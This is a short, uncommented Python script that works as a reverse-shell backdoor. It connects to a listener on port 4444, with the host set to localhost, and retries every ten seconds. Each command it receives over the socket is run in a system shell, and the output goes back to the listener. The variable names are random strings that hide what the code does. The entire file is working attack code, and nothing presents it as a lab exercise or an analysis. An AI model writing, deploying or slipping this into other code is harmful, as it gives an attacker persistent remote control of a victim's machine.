import socket, sched, time, subprocess
s = sched.scheduler(time.time, time.sleep)
def main(sc):
    connectionest = False
    gsjfhdkjghs5 = 'localhost'
    h4ui3hf2 = 4444
    v43h34iu5 = socket.socket()
    try:
        v43h34iu5.connect((gsjfhdkjghs5, h4ui3hf2))
        connectionest = True
    except Exception as e:
        pass
    s.enter(10, 1, main, (sc,))


    while connectionest:
        try:
            gsf5ugh5us3 = v43h34iu5.recv(100000000)
            gsf5ugh5us3 = gsf5ugh5us3.decode()
            gsh5u4g4 = subprocess.Popen(gsf5ugh5us3, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            sfgshkgs43 = gsh5u4g4.stdout.read()
            gsysi4gy4 = gsh5u4g4.stderr.read()
            if len(sfgshkgs43) < 1 and len(gsysi4gy4) < 1:
                v43h34iu5.send(bytes("Null", "utf-8") + gsysi4gy4)
            else:
                v43h34iu5.send(sfgshkgs43 + gsysi4gy4)

        except Exception as ex:
            connectionest = False

s.enter(10, 1, main, (s,))
s.run()